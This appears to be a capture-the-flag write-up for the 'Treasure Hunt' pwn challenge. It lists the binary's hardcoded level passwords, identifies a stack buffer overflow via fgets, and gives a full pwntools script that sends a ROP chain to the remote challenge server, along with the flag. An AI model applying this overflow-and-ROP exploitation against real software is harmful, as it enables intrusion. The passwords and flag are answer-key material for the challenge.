https://ctftime.org/event/2647

# Treasure Hunt (pwn)

Are you worthy enough to get the treasure? Let's see...

nc treasure-hunt.ctf.pearlctf.in 30008

## Analysis

```bash
$ pwn checksec vuln
[*] '/home/user/ctf/treasure_hunt/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`main` @ `0x4015f4`:

- Calls `enchanted_forest`
- Calls `desert_of_sands`
- Calls `ruins_of_eldoria`
- Calls `caverns_of_eternal_darkness`
- Calls `chamber_of_eternity`

`enchanted_forest` @ `0x4012e0`:

- Checks that you enter the password `whisp3ring_w00ds`

`desert_of_sands` @ `0x401387`:

- Checks that you enter the password `sc0rching_dunes`

`ruins_of_eldoria` @ `0x0040142e`:

- Checks that you enter the password `eldorian_ech0`

`caverns_of_eternal_darkness` @ `0x4014d5`:

- Checks that you enter the password `shadow_4byss`

`chamber_of_eternity` @ `0x40157c`:

- `fgets(local_48, 500, stdin)`
    - This allows us to ROP

`setEligibility` @ `0x40126c`:

- Sets `eligible` @ `0x404089` equal to `1`

`winTreasure` @ `00401207`:

- Writes the flag to `stdout` if `eligible` is not equal to zero

## Solution

1) Supply the passwords for each level
2) Supply a ROP chain to call `setEligibility` and then `winTreasure`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vuln", checksec=False)
context.binary = elf

##p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("treasure-hunt.ctf.pearlctf.in", 30008)

p.sendlineafter(b"proceed: ", b"whisp3ring_w00ds")
p.sendlineafter(b"proceed: ", b"sc0rching_dunes")
p.sendlineafter(b"proceed: ", b"eldorian_ech0")
p.sendlineafter(b"proceed: ", b"shadow_4byss")

p.readuntil(b"win:- ")

payload = b""
payload += b"A" * 0x48
payload += p64(elf.sym["setEligibility"])
payload += p64(elf.sym["winTreasure"])
p.sendline(payload)

p.readuntil(b"GGs\n")

print(p.readuntil(b"}").decode()) # pearl{k33p_0n_r3turning_l0l}
```

## Flag
`pearl{k33p_0n_r3turning_l0l}`

smiley 2025/03/07
